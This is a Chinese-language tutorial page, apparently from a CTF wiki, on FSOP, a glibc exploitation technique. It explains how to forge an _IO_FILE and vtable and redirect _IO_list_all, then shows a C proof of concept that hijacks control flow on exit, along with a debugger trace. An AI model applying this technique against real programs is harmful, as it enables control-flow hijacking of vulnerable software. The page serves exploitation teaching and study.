[EN](./fsop.md) | [ZH](./fsop-zh.md)
# FSOP

## 介绍
FSOP是File Stream Oriented Programming的缩写，根据前面对FILE的介绍得知进程内所有的_IO_FILE结构会使用_chain域相互连接形成一个链表，这个链表的头部由_IO_list_all维护。

FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow。

```
int
_IO_flush_all_lockp (int do_lock)
{
  ...
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
  {
       ...
       if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
	           && _IO_OVERFLOW (fp, EOF) == EOF)
	       {
	           result = EOF;
          }
        ...
  }
}
```

![](./figure/abort_routine.001.jpeg)

而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用：

1.当libc执行abort流程时

2.当执行exit函数时

3.当执行流从main函数返回时


## 示例

梳理一下FSOP利用的条件，首先需要攻击者获知libc.so基址，因为_IO_list_all是作为全局变量储存在libc.so中的，不泄漏libc基址就不能改写_IO_list_all。

之后需要用任意地址写把_IO_list_all的内容改为指向我们可控内存的指针，

之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的vtable指针。但是为了能够让我们构造的fake_FILE能够正常工作，还需要布置一些其他数据。
这里的依据是我们前面给出的

```
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
	           && _IO_OVERFLOW (fp, EOF) == EOF)
	       {
	           result = EOF;
          }
```

也就是

* fp->_mode <= 0
* fp->_IO_write_ptr > fp->_IO_write_base



在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的vtable和_IO_FILE_plus。
为了绕过验证，我们提前获得了_IO_write_ptr、_IO_write_base、_mode等数据域的偏移，这样可以在伪造的vtable中构造相应的数据

```
#define _IO_list_all 0x7ffff7dd2520
#define mode_offset 0xc0
#define writeptr_offset 0x28
#define writebase_offset 0x20
#define vtable_offset 0xd8

int main(void)
{
    void *ptr;
    long long *list_all_ptr;

    ptr=malloc(0x200);

    *(long long*)((long long)ptr+mode_offset)=0x0;
    *(long long*)((long long)ptr+writeptr_offset)=0x1;
    *(long long*)((long long)ptr+writebase_offset)=0x0;
    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);

    *(long long*)((long long)ptr+0x100+24)=0x41414141;

    list_all_ptr=(long long *)_IO_list_all;

    list_all_ptr[0]=ptr;

    exit(0);
}
```

我们使用分配内存的前0x100个字节作为_IO_FILE，后0x100个字节作为vtable，在vtable中使用0x41414141这个地址作为伪造的_IO_overflow指针。

之后，覆盖位于libc中的全局变量 _IO_list_all，把它指向我们伪造的_IO_FILE_plus。

通过调用exit函数，程序会执行 _IO_flush_all_lockp，经过fflush获取_IO_list_all的值并取出作为_IO_FILE_plus调用其中的_IO_overflow

```
---> call _IO_overflow
[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)
[#1] 0x7ffff7a8932a → Name: _IO_cleanup()
[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=<optimized out>, run_list_atexit=0x1)
[#3] 0x7ffff7a47045 → Name: __GI_exit(status=<optimized out>)
[#4] 0x4005ce → Name: main()

```
